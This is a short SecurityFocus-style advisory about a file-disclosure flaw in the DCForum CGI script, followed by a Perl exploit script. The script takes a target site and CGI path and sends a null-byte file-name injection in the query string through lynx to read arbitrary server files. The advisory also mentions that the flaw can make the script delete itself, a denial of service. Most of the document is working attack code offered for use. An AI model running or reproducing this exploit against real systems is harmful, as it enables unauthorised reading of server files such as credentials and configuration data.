source : http://www.securityfocus.com/bid/1951/info


DCForum is a commercial cgi script from DCScripts which is designed to facilitate web-based threaded discussion forums.

The script improperly validates user-supplied input, which allows the remote viewing of arbitrary files on the host which are readable by user 'nobody' or the webserver. Additionally, it has been reported that the dcforum.cgi script can be made to delete itself if the attacker attempts to read its source code using this method, effectively permitting a denial-of-service attack.


#!/usr/bin/perl
# DC Forum Vulnerablitiy(Found In Versions From 1.0 - 6.0 According To
CGISecurity.com Advisory)
# Exploits Vulnerability That Allows Remote File Reading
# By SteeLe
# BEGIN { open(STDERR,">errors.txt"); } error checking
$lynx = "/usr/bin/lynx"; # specify

$site = $ARGV[0];
$cgi  = $ARGV[1];
$inet = inet_aton($site);

die "\n\t---   Usage:$0 <site> <cgi location,duh>  ---" if(@ARGV == '0' ||
@ARGV < 2);

print "\n\t---   DCForum 1.0 - 6.0 Exploit ---";
print "\n\t---   By the cool fellas at *   ---\n\n";

while(true) { # yea i think I stole this from the pollex.pl , uh thanks.

print "[dcforum]Option:";
$action = <STDIN>;
chomp($action);

print "Valid Options: r(read files, usage r <file>), q(quit)\n" if($action
ne "r" || $action ne "q");

if ($action eq "r") {
print "\nFile(to read):";
$file = <STDIN>;
chomp($file);
# Old fashion shit, and I was lazy so be happy
$url = "?az=list&file=$file%00";
$site = `$lynx http://$site$cgi$url`;
print $site;
}
elsif ($action eq "q") {
 print "now exiting program\n";
 exit;
  }
}
# (c) 2000 [Warez To Tha Extreme(Damn Thats A Lie)]
